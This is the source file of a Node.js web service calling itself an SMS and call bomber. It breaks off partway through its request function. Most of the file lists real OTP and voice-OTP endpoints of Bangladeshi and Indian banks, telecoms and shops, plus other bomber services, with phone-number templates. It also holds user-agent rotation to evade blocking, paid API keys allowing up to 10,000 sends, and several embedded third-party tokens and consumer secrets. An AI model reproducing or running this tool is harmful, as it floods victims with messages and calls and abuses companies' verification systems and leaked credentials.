// ============================================================
// ULTIMATE SMS BOMBER V10.0 — api/index.js (TNEH GROUP Edition)
// Optimized Queue System + New APIs
// ============================================================
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const CONFIG = {
  server: { port: process.env.PORT || 3000, host: '0.0.0.0' },
  performance: {
    timeout: 15000, // 15 seconds per request
    concurrency: 5, // ⚡ এখানে ৫টি রিকোয়েস্ট একসাথে যাবে, বাকিগুলো লাইনে থাকবে (যাতে সাইট ব্লক না করে)
    maxCountPerAPI: 100
  },
  security: { rateLimit: { enabled: false } }
};

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  api_version: "10.0.0-TNEH"
};

const ERROR_MESSAGES = {
  MISSING_PARAM: 'Missing parameter',
  INVALID_PHONE: 'Invalid phone',
  INVALID_API_KEY: 'Invalid key',
  JOB_NOT_FOUND: 'Job not found'
};

// ============================================================
// UTILITY
// ============================================================
class Utility {
  static generateJobId() {
    return `JOB_${Date.now().toString(36).toUpperCase()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
  }
  static generateApiKey() {
    return `TNEH_${crypto.randomBytes(24).toString('hex').toUpperCase()}_${Date.now().toString(36).toUpperCase()}`;
  }
  static maskPhone(p) {
    return (!p || p.length < 7) ? '***' : p.slice(0, 3) + '****' + p.slice(-3);
  }
  static parsePhone(p) { return String(p).replace(/[^0-9]/g, ''); }

  static isValidBD(p) {
    const c = this.parsePhone(p);
    return /^(01)[3-9][0-9]{8}$/.test(c) || /^(8801)[3-9][0-9]{8}$/.test(c);
  }
  // BD API তে পাঠানোর জন্য ফোন নম্বর রেডি করা
  static normalizeBD(p) {
    const c = this.parsePhone(p);
    if (c.startsWith('01')) return '88' + c; // 017... -> 88017...
    if (c.startsWith('8801')) return c;       // 88017... -> 88017...
    return c;
  }
  static isValidIN(p) {
    const c = this.parsePhone(p).replace(/^91/, '').replace(/^0+/, '');
    return /^[6-9][0-9]{9}$/.test(c);
  }
  // IN API তে পাঠানোর জন্য ফোন নম্বর রেডি করা
  static normalizeIN(p) {
    const raw = this.parsePhone(p);
    if (raw.startsWith('91') && raw.length === 12) return raw.slice(2);
    if (raw.startsWith('0')) return raw.slice(1);
    return raw;
  }
  static formatBytes(b) {
    if (b === 0) return '0 B';
    const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(b) / Math.log(k));
    return (b / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
  }
  static getMemoryUsage() {
    const u = process.memoryUsage();
    return { rss: this.formatBytes(u.rss), heapUsed: this.formatBytes(u.heapUsed) };
  }
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'
];

function getHeaders(extra = {}) {
  return {
    'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
    'Connection': 'keep-alive',
    ...extra
  };
}

// ============================================================
// BD API LIST (আপনার দেওয়া অরিজিনাল লিস্ট)
// ============================================================
const BD_APIS = [
  { name: "QuizGiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null" },
  { name: "Dhaka Bank", method: "POST", url: "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", body: '{"AccessToken":"","TrackingNo":"","mobileNo":"{phone_10}","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}' },
  { name: "Circle Robi", method: "POST", url: "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn={phone}" },
  { name: "Shajgoj", method: "POST", url: "https://shop.shajgoj.com/wp-admin/admin-ajax.php", body: 'action=xoo_ml_login_with_otp&xoo-ml-phone-login={phone_10}&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp', isFormData: true },
  { name: "KhaoDao", method: "POST", url: "https://api.eat-z.com/auth/customer/signin", body: '{"username":"+{phone}"}' },
  { name: "TheMallBD", method: "POST", url: "https://themallbd.com/api/auth/otp_login", body: '{"phone_number":"+{phone}"}' },
  { name: "Fundesh Win", method: "POST", url: "https://win.fundesh.com.bd/authSrv/auth/generateOtp", body: '{"msisdn":"{phone_10}","clientId":"d2c_client"}' },
  { name: "Arogga", method: "POST", url: "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0", body: 'mobile=+{phone}', isFormData: true },
  { name: "OsudPotro", method: "POST", url: "https://api-2.osudpotro.com/api/v1/users/send_otp", body: '{"mobile":"+88-{phone_10}","deviceToken":"web","language":"en","os":"web"}' },
  { name: "Bongo", method: "POST", url: "https://api.bongo-solutions.com/auth/api/login/send-otp", body: '{"operator":"all","msisdn":"{phone}"}' },
  { name: "BTCL MyBTCL", method: "POST", url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", body: '{"phoneNbr":"{phone_10}","email":"","OTPType":1,"userName":""}' },
  { name: "Bioscope Plus", method: "POST", url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+{phone}"}' },
  { name: "BD Tickets", method: "POST", url: "https://api.bdtickets.com:20100/v1/auth", body: '{"createUserCheck":true,"phoneNumber":"+{phone}","applicationChannel":"WEB_APP"}' },
  { name: "Apex4U", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: '{"phoneNumber":"{phone_10}"}' },
  { name: "Swap", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: '{"phone":"{phone_10}"}' },
  { name: "Ilyn Global", method: "POST", url: "https://api.ilyn.global/auth/signup", body: '{"phone":{"code":"BD","number":"+{phone}"},"provider":"sms"}' },
  { name: "Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v3/user/login", body: '{"mobile":"{phone_10}","recaptcha_token":"garibookcaptcha","channel":"web"}' },
  { name: "Sheba", method: "POST", url: "https://accountkit.sheba.xyz/api/shoot-otp", body: '{"mobile":"+{phone}","app_id":"8329815A6D1AE6DD","api_token":"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}' },
  { name: "AppLink", method: "POST", url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", body: '{"msisdn":"{phone}"}' },
  { name: "Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_10}" },
  { name: "GP Web Login", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", body: 'msisdn={phone_10}', isFormData: true },
  { name: "Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: '{"mobile_no":"{phone_10}"}' },
  { name: "DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+{phone}"}' },
  { name: "ePharma", method: "POST", url: "https://epharma.com.bd/authentication/send-otp", body: 'number=+{phone}', isFormData: true },
  { name: "Isho", method: "POST", url: "https://www.isho.com/register_otp", body: 'phone={phone_10}&email=test@gmail.com', isFormData: true },
  { name: "Robi Doorstep", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone_10}","type":"doorstep"}' },
  { name: "Banglalink", method: "POST", url: "https://web-api.banglalink.net/api/v1/user/otp-login/request", body: '{"mobile":"{phone_10}"}' },
  { name: "Robi DA NLL", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: '{"msisdn":"{phone_10}"}' },
  { name: "Redx", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: '{"phoneNumber":"{phone_10}"}' },
  { name: "Chorki", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", body: '{"number":"+{phone}"}' },
  { name: "Jatri", method: "POST", url: "https://user-api.jslglobal.co:444/v2/send-otp", body: '{"phone":"+{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}' },
  { name: "Shikho", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: '{"phone":"{phone_10}","type":"student","auth_type":"signup"}' },
  { name: "Easy", method: "POST", url: "https://core.easy.com.bd/api/v1/forgot-password-otp", body: '{"device_key":"2ea97d276a980993308116baa292cec9","mobile":"{phone_10}"}' },
  { name: "Walton", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create", body: '{"auth":{"countryCode":"880","deviceUuid":"ee757830-f639-12f0-9f4d-2f972746fhg","phone":"{phone_10}"},"captchaToken":"recapcha"}' },
  { name: "Chardike", method: "POST", url: "https://api.chardike.com/api/otp/send", body: '{"phone":"{phone_10}","otp_type":"login"}' },
  { name: "Otithee", method: "POST", url: "https://gateway.otithee.com/api/v1/generate-otp", body: '{"request_type":"registration","mobile_number":"{phone_10}"}' },
  { name: "Mojaru", method: "POST", url: "https://new.mojaru.com/api/student/login", body: '{"mobile_or_email":"{phone_10}"}' },
  { name: "AppCity", method: "POST", url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", body: '{"mobileNumber":"{phone_10}"}' },
  { name: "Upay", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: '{"wallet_number":"{phone_10}","geo_location":{"lat":23.89,"long":89.13},"referral":"","firebase_token":"dummy","device_uuid":"c65m117a8cbf5b1851b29f8b","mno":"Robi"}' },
  { name: "Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: '{"phone":"{phone_10}","intent":"login"}' },
  { name: "Ostad", method: "POST", url: "https://api.ostad.app/api/v2/user/with-otp", body: '{"msisdn":"{phone_10}"}' },
  { name: "Hishabee", method: "GET", url: "https://app.hishabee.business/api/V2/otp/send?mobile_number={phone_10}" },
  { name: "MithaiBD", method: "POST", url: "https://mithaibd.com/api/login/", body: '{"company_id":"2","phone":"{phone_10}","email":"test@mail.com","password1":"pass123","otp_verify":false}' },
  { name: "Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: '{"mobileNumber":"+{phone}"}' },
  { name: "Win2gain", method: "GET", url: "https://api.win2gain.com/api/Users/RequestOtp?msisdn={phone}" },
  { name: "BdStall", method: "POST", url: "https://www.bdstall.com/userRegistration/save_otp_info/", body: 'UserTypeID=2&RequestType=1&Name=Md&Mobile={phone_10}', isFormData: true },
  { name: "KireiBD", method: "POST", url: "https://app.kireibd.com/api/v2/send-login-otp", body: '{"email":"{phone_10}"}' },
  { name: "Wafilife", method: "GET", url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone_10}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" },
  { name: "eTestPaper", method: "POST", url: "https://prod.etestpaper.net/api/v4/auth/otp", body: '{"phone":"{phone_10}","recaptcha":"668be73dcad2999a957ff440"}' },
  { name: "Sundora", method: "POST", url: "https://api.sundora.com.bd/api/user/customer/", body: '{"customer":{"email":"test{phone_10}@gmail.com","password":"#bUV?3*N7N.g","password_confirmation":"#bUV?3*N7N.g","phone":"+{phone}","first_name":"Test","last_name":"User","newsletter_email":true,"newsletter_sms":true}}' },
  { name: "Meenabazar", method: "POST", url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone_10}&type=login" },
  { name: "MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"Test","lastName":"","gender":"M","email":"test{phone_10}@gmail.com","userName":"{phone_10}","password":"Kamrul12345@","confirmPassword":"Kamrul12345@","status":0,"mobile":"{phone_10}","workAreaCategory":2,"createdFrom":0,"createdAt":"{ts}","userNameType":"mobile","countryCode":"88"}' },
  { name: "RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"Test User","service":"redx","phoneNumber":"{phone_10}"}' },
  { name: "KhaasFood", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php", body: 'mobileNo=+{phone}&countrycode=+880&csrf=9d9d08e6e5&login=1&json=1&action=digits_check_mob', isFormData: true },
  { name: "eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone_10}" },
  { name: "Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: '{"phone":"{phone_10}"}' },
  { name: "BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: '{"phone":"+{phone}"}' },
  { name: "Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: '{"phoneNumber":"{phone_10}","requestType":"send","emailConsent":true,"whatsappConsent":true}' },
  { name: "Binge", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: '{"mobile":"{phone_10}"}' },
  { name: "NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: '{"phone_number":"{phone_10}"}' },
  { name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: '{"phone":"{phone_10}","applicationChannel":"WEB_APP"}' }
];

// ============================================================
// INDIAN API LIST (আপনার দেওয়া নতুন লিস্ট)
// ============================================================
const IN_APIS = [
  { name: "Felix XBOM", method: "GET", url: "https://felix-xbom-wyt2.onrender.com/bom?key=demo&num={phone}" },
  { name: "SMS Bomber", method: "GET", url: "http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}" },
  { name: "Bomberrr Vercel", method: "GET", url: "https://bomberrr.vercel.app/?key=roots&number={phone}" },
  { name: "Bolbet", method: "GET", url: "https://bolbet-liart.vercel.app/?key=roots&number={phone}" },
  { name: "FreeFire Bomber", method: "GET", url: "https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=10" },
  { name: "Call Bomber PRO", method: "GET", url: "https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}" },
  { name: "Bomberr Xtreme", method: "GET", url: "https://bomberr.onrender.com/num={phone}" },
  { name: "Bombar API 1", method: "GET", url: "https://bombar-1.vercel.app/api/bom?number={phone}" },
  { name: "Bombar API 2", method: "GET", url: "https://bombar-api-2.vercel.app/all?number={phone}" },
  { name: "Mahadev Bomber", method: "GET", url: "https://bomber-by-mahadev.paskhinpf9.workers.dev/?phone={phone}" },
  { name: "Splexxo1", method: "GET", url: "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO" },
  { name: "Ultimate Bomber", method: "GET", url: "https://ultimate-bomber.vercel.app/api/bomb?number={phone}" },
  { name: "Mega Bomber", method: "GET", url: "https://mega-bomber.onrender.com/api?phone={phone}" },
  { name: "Atomic Bomber", method: "GET", url: "https://atomic-bomber.cyclic.app/bomb?num={phone}" },
  { name: "Nuclear Bomber", method: "GET", url: "https://nuclear-bomber.herokuapp.com/api?phone={phone}" },
  { name: "Fury Bomber", method: "GET", url: "https://fury-bomber.vercel.app/api/bomb?number={phone}" },

  { name: "Tata Capital Voice", method: "POST", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}' },
  { name: "1MG Voice", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token", headers: { "Content-Type": "application/json" }, body: '{"number":"{phone}","otp_on_call":true}' },
  { name: "Swiggy Call", method: "POST", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Myntra Voice", method: "POST", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Flipkart Voice", method: "POST", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Amazon Voice", method: "POST", url: "https://www.amazon.in/ap/signin", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phone={phone}&action=voice_otp', isFormData: true },
  { name: "Paytm Voice", method: "POST", url: "https://accounts.paytm.com/signin/voice-otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "Zomato Voice", method: "POST", url: "https://www.zomato.com/php/o2_api_handler.php", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phone={phone}&type=voice', isFormData: true },
  
  { name: "Hotstar", method: "PUT", url: "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", headers: { "Content-Type": "application/json" }, body: '{"phone_number":"{phone}","country_prefix":"91"}' },
  { name: "AltBalaji", method: "POST", url: "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", headers: { "Content-Type": "application/json" }, body: '{"phone_number":"{phone}","country_code":"91","platform":"web"}' },
  { name: "SonyLIV", method: "POST", url: "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", headers: { "Content-Type": "application/json" }, body: '{"channelPartnerID":"MSMIND","mobileNumber":"{phone}","country":"IN","timestamp":"{ts}"}' },
  { name: "Zee5", method: "GET", url: "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}" },

  { name: "Flipkart", method: "POST", url: "https://www.flipkart.com/api/6/user/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"mobileNumber":"{phone}"}' },
  { name: "Amazon", method: "POST", url: "https://www.amazon.in/ap/signin", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'email={phone}&create=1', isFormData: true },
  { name: "Myntra", method: "POST", url: "https://www.myntra.com/gw/mobile-auth/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Ajio", method: "POST", url: "https://www.ajio.com/api/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"mobileNumber":"{phone}"}' },
  { name: "BigBasket", method: "POST", url: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", headers: { "Content-Type": "application/json" }, body: '{"mobile_number":"{phone}"}' },
  { name: "Croma", method: "POST", url: "https://api.croma.com/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "Reliance Digital", method: "POST", url: "https://www.reliancedigital.in/api/otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "FirstCry", method: "POST", url: "https://www.firstcry.com/api/sendotp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Licious", method: "POST", url: "https://api.licious.com/otp/send", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "Zepto", method: "POST", url: "https://api.zepto.com/v2/otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Blinkit", method: "POST", url: "https://blinkit.com/api/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "Meesho", method: "POST", url: "https://api.meesho.com/v2/auth/send-otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "Snapdeal", method: "POST", url: "https://m.snapdeal.com/signupCompleteAjax", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'j_mobilenumber={phone}', isFormData: true },
  { name: "Nykaa", method: "POST", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'source=sms&mobile_number={phone}', isFormData: true },
  { name: "Lenskart", method: "POST", url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", headers: { "Content-Type": "application/json" }, body: '{"phoneCode":"+91","telephone":"{phone}"}' },

  { name: "Zomato", method: "POST", url: "https://www.zomato.com/webroutes/auth/login", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","verification_type":"sms"}' },
  { name: "Swiggy", method: "POST", url: "https://www.swiggy.com/mapi/auth/signup", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Dominos", method: "POST", url: "https://api.dominos.co.in/loginhandler/forgotpassword", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "KFC", method: "POST", url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", headers: { "Content-Type": "application/json" }, body: '{"phoneNumber":"{phone}"}' },
  { name: "Pizza Hut", method: "POST", url: "https://api.pizzahut.io/v1/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"phone":"+91{phone}"}' },

  { name: "IRCTC", method: "POST", url: "https://www.irctc.co.in/api/otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "RedBus", method: "GET", url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91" },
  { name: "MakeMyTrip", method: "POST", url: "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered", headers: { "Content-Type": "application/json" }, body: '{"loginId":"{phone}","type":"MOBILE","countryCode":"91"}' },
  { name: "Goibibo", method: "POST", url: "https://www.goibibo.com/api/otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "OYO", method: "POST", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","country_code":"+91","nod":4}' },
  { name: "ConfirmTkt", method: "GET", url: "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}" },
  { name: "HappyEasyGo", method: "GET", url: "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}" },

  { name: "Unacademy", method: "POST", url: "https://unacademy.com/api/v3/user/user_check/", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","send_otp":true}' },
  { name: "Vedantu", method: "POST", url: "https://user.vedantu.com/user/preLoginVerification", headers: { "Content-Type": "application/json" }, body: '{"phoneNumber":"{phone}","phoneCode":"+91"}' },
  { name: "Byju's", method: "POST", url: "https://bcas-prod.byjusweb.com/api/send-otp", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phoneNumber={phone}', isFormData: true },
  { name: "Doubtnut", method: "POST", url: "https://doubtnut.com/api/v1/user/login", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phone={phone}', isFormData: true },
  { name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "UpGrad", method: "POST", url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", headers: { "Content-Type": "application/json" }, body: '{"phoneNumber":"+91{phone}"}' },

  { name: "Google Pay", method: "POST", url: "https://pay.google.com/api/otp", headers: { "Content-Type": "application/json" }, body: '{"phoneNumber":"{phone}"}' },
  { name: "Amazon Pay", method: "POST", url: "https://pay.amazon.in/api/otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Mobikwik", method: "POST", url: "https://www.mobikwik.com/otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "Freecharge", method: "POST", url: "https://www.freecharge.in/api/otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "PhonePe", method: "POST", url: "https://www.phonepe.com/api/v2/otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },

  { name: "NoBroker", method: "POST", url: "https://www.nobroker.in/api/v3/account/otp/send", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phone={phone}&countryCode=IN', isFormData: true },
  { name: "PharmEasy", method: "POST", url: "https://pharmeasy.in/api/v2/auth/send-otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", headers: { "Content-Type": "application/json" }, body: '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}' },
  { name: "ShipRocket", method: "POST", url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", headers: { "Content-Type": "application/json" }, body: '{"mobileNumber":"{phone}"}' },
  { name: "BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","city":362}' },
  { name: "Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "Housing.com", method: "POST", url: "https://login.housing.com/api/v2/send-otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
  { name: "RummyCircle", method: "POST", url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
  { name: "My11Circle", method: "POST", url: "https://www.my11circle.com/api/fl/auth/v3/getOtp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' }
];

// ============================================================
// JOB STORE
// ============================================================
class JobStore {
  constructor() {
    this.active = new Map();
    this.completed = new Map();
    this.stats = { totalJobs: 0, totalSuccess: 0, totalFailed: 0, startTime: Date.now() };
  }
  create({ phone, region, total }) {
    const id = Utility.generateJobId();
    const job = { id, phone, masked: Utility.maskPhone(phone), region, total,
      sent: 0, success: 0, fail: 0, startTime: Date.now(), status: 'active', errors: [], stopped: false };
    this.active.set(id, job); this.stats.totalJobs++; return id;
  }
  isActive(id) {
    const j = this.active.get(id);
    return j && !j.stopped && j.status === 'active';
  }
  stop(id) {
    const j = this.active.get(id);
    if (!j) return false;
    j.stopped = true; j.status = 'stopped'; j.endTime = Date.now();
    this.active.delete(id); this.completed.set(id, j); return true;
  }
  stopAll(region = null) {
    let c = 0;
    for (const [id, j] of [...this.active.entries()]) {
      if (region && j.region !== region) continue;
      if (this.stop(id)) c++;
    }
    return c;
  }
  bump(id, ok, err = null) {
    const j = this.active.get(id);
    if (!j || j.stopped) return;
    j.sent++;
    if (ok) { j.success++; this.stats.totalSuccess++; }
    else {
      j.fail++; this.stats.totalFailed++;
      if (err && j.errors.length < 30) j.errors.push(String(err).slice(0, 200));
    }
    if (j.sent >= j.total) {
      j.status = 'completed'; j.endTime = Date.now();
      this.active.delete(id); this.completed.set(id, j);
    }
  }
  view(id) {
    const j = this.active.get(id) || this.completed.get(id);
    if (!j) return null;
    return { id: j.id, phone: j.masked, region: j.region, total: j.total, sent: j.sent, success: j.success, fail: j.fail,
      progress: ((j.sent / j.total) * 100).toFixed(2) + '%', status: j.status, start: j.startTime, end: j.endTime || null, stopped: j.stopped, errors: j.errors.slice(-5) };
  }
  all() {
    const out = [];
    for (const j of this.active.values()) out.push(this.view(j.id));
    for (const j of this.completed.values()) out.push(this.view(j.id));
    return out;
  }
  summary() {
    const tot = this.stats.totalSuccess + this.stats.totalFailed;
    return { totalJobs: this.stats.totalJobs, totalSuccess: this.stats.totalSuccess, totalFailed: this.stats.totalFailed,
      successRate: tot > 0 ? ((this.stats.totalSuccess / tot) * 100).toFixed(2) + '%' : '0%',
      active: this.active.size, completed: this.completed.size, uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's', memory: Utility.getMemoryUsage() };
  }
}
const jobs = new JobStore();

// ============================================================
// KEY MANAGER
// ============================================================
const PLAN_CONFIG = {
  default:    { name: 'Default',    maxCount: 300,    requiresKey: false },
  premium:    { name: 'Premium',    maxCount: 10000,  requiresKey: true  }
};
class KeyManager {
  constructor() {
    this.file = path.join('/tmp', 'keys.json'); // Vercel safe
    this.keys = this.load();
  }
  load() {
    try {
      if (fs.existsSync(this.file)) {
        const data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
        const m = new Map();
        Object.entries(data).forEach(([k, v]) => m.set(k, { expiry: new Date(v.expiry), plan: v.plan, usageCount: v.usageCount || 0 }));
        return m;
      }
    } catch {}
    return new Map();
  }
  save() {
    try {
      const obj = {};
      for (const [k, v] of this.keys.entries()) obj[k] = { expiry: v.expiry.toISOString(), plan: v.plan, usageCount: v.usageCount || 0 };
      fs.writeFileSync(this.file, JSON.stringify(obj, null, 2));
    } catch {}
  }
  mint(plan = 'premium', days = 30) {
    const key = Utility.generateApiKey();
    const expiry = new Date(); expiry.setDate(expiry.getDate() + days);
    this.keys.set(key, { expiry, plan, usageCount: 0 }); this.save();
    return { apiKey: key, expiryDate: expiry, plan };
  }
  validate(key) { return this.keys.has(key) && new Date() < this.keys.get(key).expiry; }
  info(key) {
    if (!this.keys.has(key)) return null;
    const k = this.keys.get(key);
    return { key, plan: k.plan, expires: k.expiry.toISOString(), valid: new Date() < k.expiry, daysLeft: Math.max(0, Math.ceil((k.expiry - new Date()) / 86400000)), usageCount: k.usageCount };
  }
  use(key) {
    const k = this.keys.get(key);
    if (!k) return false;
    k.usageCount = (k.usageCount || 0) + 1; this.save(); return true;
  }
}
const keys = new KeyManager();

// ============================================================
// ENGINE (Core Function)
// ============================================================
async function callOne(api, phone, jobId) {
  if (!jobs.isActive(jobId)) return { stopped: true };

  // URL ভেরিয়েবল রিপ্লেস
